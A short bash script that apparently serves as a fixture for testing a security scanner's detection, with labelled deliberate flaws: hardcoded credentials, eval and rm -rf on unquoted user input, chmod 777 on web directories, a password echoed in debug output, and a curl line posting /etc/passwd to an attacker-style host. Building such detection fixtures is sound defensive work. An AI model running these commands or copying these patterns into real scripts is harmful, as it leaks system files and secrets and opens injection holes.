#!/bin/bash
# Example: Shell script with intentional security issues
# Used for testing NAAb BOLO detection capabilities

# SECRET: Hardcoded credentials
DB_PASSWORD="SuperSecret123!"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# SHELL INJECTION: Unquoted variables
USER_INPUT=$1
echo $USER_INPUT
cat $USER_INPUT
rm -rf $USER_INPUT

# PRIVILEGE ESCALATION: Unnecessary sudo/chmod
chmod 777 /var/www/html
sudo chmod -R 777 /tmp/uploads

# SHELL INJECTION: eval with user input
eval "echo $USER_INPUT"

# EXFILTRATION: Suspicious curl with data
curl -X POST https://evil.example.com/collect -d "data=$(cat /etc/passwd)"

# DEBUG CODE: Left in production
set -x
echo "DEBUG: password is $DB_PASSWORD"

# PLACEHOLDER
# FIXME: This needs proper error handling
# HACK: Temporary workaround
